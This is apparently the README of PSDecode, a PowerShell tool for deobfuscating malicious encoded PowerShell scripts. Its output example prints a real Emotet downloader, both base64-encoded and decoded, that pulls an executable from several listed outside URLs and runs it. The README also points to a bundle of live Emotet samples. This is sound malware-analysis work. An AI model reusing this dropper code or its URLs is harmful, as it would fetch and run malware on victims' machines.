# PSDecode
This is a PowerShell script for deobfuscating other encoded PowerShell scripts. Often, malicious PowerShell scripts have several layers of encodings  (Replace, Base64Decode, etc...) that, once decoded, are executed via a call to Invoke-Expression (IEX, &, .), Invoke-Command, etc... This script employs a technique called method overriding that enables us to essentially intercept calls to functions that I have accounted for within this script and print out the arguments being passed to it (a.k.a what the script was trying to execute).

** Important Note #1: Only run this script within an isolated sandbox. If the encoded powershell attempts to execute a function which I have not accounted for, there is a chance it could execute**

** Important Note #2: The default execution policy for PowerShell is Restricted and if you dont use PowerShell a lot, chances are when you go to run this script, it will give you an error stating "PSDecode cannot be loaded because the execution of scripts is disabled on this system". If you receive this message, you'll need to change you execution policy to Unrestricted either temporarility or permanantly. The simplest way is to open a PowerShell command prompt as Administrator and run: set-executionpolicy unrestricted**

# To Use
1. Copy PSDecode.psm1 into $PSHome\Modules\
2. Open a new instance of PowerShell
3. Option #1 [Pass encoded PowerShell via File]:
<pre> > PSDecode .\encoded_ps.ps1</pre>
4. Option #2 [Pass encoded PowerShell via PIPE]:
<pre> > Get-Content .\encoded_ps.ps1 | PSDecode </pre>

# Example Powershell Scripts
In this repository, I've included Emotet_PowerShell_Examples.zip, which contains a few different **LIVE** emotet PowerShell scripts. You can use these to play around with PSDecode and get a better understanding of how it is supposed to function. It is important to note that **these examples are malicious** and could potentially result in an infection if handled improperly. These are provided for educational purposes only and I assume no responsibility for what you do with them. You've been warned.

The password for the archive is: **infected**

# Output Example
```PowerShell
############################## Layer 1 ##############################
JABMAF8ANQAyADIAMwA9ACcAagA1ADgANwAxADkAMQA3ACcAOwAkAGsAMwAxADMAMwA3ADAANAAgAD0AIAAnADQANQAyACcAOwAkAGoAMgAzADEAOAAwAF8APQAnAHMAMQA2ADMANwA3ADEANgAnADsAJABSAF8ANgA4ADkAMgA4AD0AJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQArACcAXAAnACsAJABrADMAMQAzADMANwAwADQAKwAnAC4AZQB4AGUAJwA7ACQAUwA2ADAAMwBfADAAMwAxAD0AJwBNADgAMgA5ADgAOQAnADsAJABuADIANwAwADEANgAwAD0AJgAoACcAbgAnACsAJwBlAHcALQBvAGIAagAnACsAJwBlAGMAdAAnACkAIABuAGUAdAAuAHcAYABFAGAAQgBgAEMATABgAGkAZQBuAFQAOwAkAFEANQAzADAANAA3ADcAPQAnAGgAdAB0AHAAOgAvAC8AcAByAG8AbABpAG4AZQBiAHIAYQBjAGkAbgBnAC4AYwBvAG0ALwB3AHAALQBjAG8AbgB0AGUAbgB0AC8AMwB3ADgAMwBkAGYAbgAzADcANAAvADMAdwA4ADMAZABmAG4AMwA3ADQALwBAAGgAdAB0AHAAOgAvAC8AcgBlAGkAbwB1AHQAcwBvAHUAcgBjAGkAbgBnAC4AYwBvAG0ALwB3AHAALQBjAG8AbgB0AGUAbgB0AC8AZgBrADQANAA4AC8AQABoAHQAdABwADoALwAvAGIAdQBjAHUAcgBlAHMAdABpAC4AYQBuAGQAcgBlAGUAYQAtAGUAcwBjAG8AcgB0AC4AYwBvAG0ALwB3AHAALQBpAG4AYwBsAHUAZABlAHMALwBuAHkAZwA5ADIANwAxAC8AQABoAHQAdABwAHMAOgAvAC8AcAByAGkAbQBlAG4AZQB3AHMAbwB2AGUAcgBzAGUAYQBzAC4AYwBvAG0ALwByAGkAdABuAGMAegAvADgAOQA2ADQANAAxAC8AQABoAHQAdABwADoALwAvAHMAdABlAHAAdABvAGIAZQB0AHQAZQByAC4AYwBvAG0ALwBjAGcAaQAtAGIAaQBuAC8AOQBsAHcANABzAGsAMwA3ADkANgA5AC8AJwAuAHMAcABsAGkAdAAoACcAQAAnACkAOwAkAHUAOAAzADIANwA0AD0AJwB1ADYAMQA2ADkANgA3ACcAOwBmAG8AcgBlAGEAYwBoACgAJAB3ADIAOAA1ADYAXwAwACAAaQBuACAAJABRADUAMwAwADQANwA3ACkAewB0AHIAeQB7ACQAbgAyADcAMAAxADYAMAAuAEQAbwBXAG4AbABPAEEARABmAEkATABFACgAJAB3ADIAOAA1ADYAXwAwACwAIAAkAFIAXwA2ADgAOQAyADgAKQA7ACQASgA5ADAAMwAzADUAMAA5AD0AJwBJAF8AOQA2ADAANQAxACcAOwBJAGYAIAAoACgALgAoACcARwAnACsAJwBlAHQALQBJAHQAJwArACcAZQBtACcAKQAgACQAUgBfADYAOAA5ADIAOAApAC4AbABFAE4ARwB0AGgAIAAtAGcAZQAgADMAMQA5ADYAMQApACAAewAmACgAJwBJACcAKwAnAG4AdgBvAGsAZQAtAEkAdABlACcAKwAnAG0AJwApACAAJABSAF8ANgA4ADkAMgA4ADsAJABLADAANgAyADUAXwA5AD0AJwBaADgAMgA2AF8ANgBfADMAJwA7AGIAcgBlAGEAawA7ACQAUAA1ADQAMwAwAF8AOAAyAD0AJwBFADgAXwA0ADEANwAnAH0AfQBjAGEAdABjAGgAewB9AH0AJABwADkAMwA3ADkAMQA9ACcARAA1ADkAMQAwADIAMwBfACcA

############################## Layer 2 ##############################
$L_5223='j5871917';$k3133704 = '452';$j23180_='s1637716';$R_68928=$env:userprofile+'\'+$k3133704+'.exe';$S603_031='M82989';$n270160=&('new-object') net.wEBCLienT;$Q530477='http://prolinebracing.com/wp-content/3w83dfn374/3w83dfn374/@http://reioutsourcing.com/wp-content/fk448/@http://bucuresti.andreea-escort.com/wp-includes/nyg9271/@https://primenewsoverseas.com/ritncz/896441/@http://steptobetter.com/cgi-bin/9lw4sk37969/'.split('@');$u83274='u616967';foreach($w2856_0 in $Q530477){try{$n270160.DoWnlOADfILE($w2856_0, $R_68928);$J9033509='I_96051';If ((.('Get-Item') $R_68928).lENGth -ge 31961) {&('Invoke-Item') $R_68928;$K0625_9='Z826_6_3';break;$P5430_82='E8_417'}}catch{}}$p93791='D591023_'

######################### Beautified Layer ##########################
$L_5223='j5871917';
$k3133704 = '452';
$j23180_='s1637716';
$R_68928=$env:userprofile+'\'+$k3133704+'.exe';
$S603_031='M82989';
$n270160=&('new-object') net.wEBCLienT;
$Q530477='http://prolinebracing.com/wp-content/3w83dfn374/3w83dfn374/@http://reioutsourcing.com/wp-content/fk448/@http://bucuresti.andreea-escort.com/wp-includes/nyg9271/@https://primenewsoverseas.com/ritncz/896441/@http://steptobetter.com/cgi-bin/9lw4sk37969/'.split('@');
$u83274='u616967';
foreach($w2856_0 in $Q530477){
	try{
		$n270160.DoWnlOADfILE($w2856_0, $R_68928);
		$J9033509='I_96051';
		If ((.('Get-Item') $R_68928).lENGth -ge 31961) {
			&('Invoke-Item') $R_68928;
			$K0625_9='Z826_6_3';
			break;
			$P5430_82='E8_417'}
		}
	catch{
		}
	}
$p93791='D591023_'


############################## Actions ##############################
    1. [System.Net.WebClient.DownloadFile] Download From: http://prolinebracing.com/wp-content/3w83dfn374/3w83dfn374/ --> Save To: C:\Users\REM\452.exe
    2. [Get-Item.length] Retrieving length of 100000 for: C:\Users\REM\452.exe
    3. [Invoke-Item] Execute/Open: C:\Users\REM\452.exe
```
# Change Log
* 2019.05.20
 * Added Get-Item override.
 * Implemented string formatting resolver.
 * Automatic input encoding detection. -u switch is no longer required.
 * Can now handle Base64 encoded input.
 * Final layer is now Beautified.
 * DownloadFile action now only takes up a single line in the Actions output.
* 2018.06.05
  * Included -u switch that users will need to specify if the powershell script they are attempting to decode is Unicode encoded.
  * Updated script to properly handle the presence of whitespace characters wrapped in quotes.
* 2018.05.30
  * Added better handling of double quotes during script building to eliminate hard failure.
  * Implemented replace function to replace the string concatenation '+' that could be found within a malicious script with an empty string. Eliminates simple obfuscation in layer output.
* 2018.03.20 - updated script to account for changes made to newest version of Emotet's encoding scheme
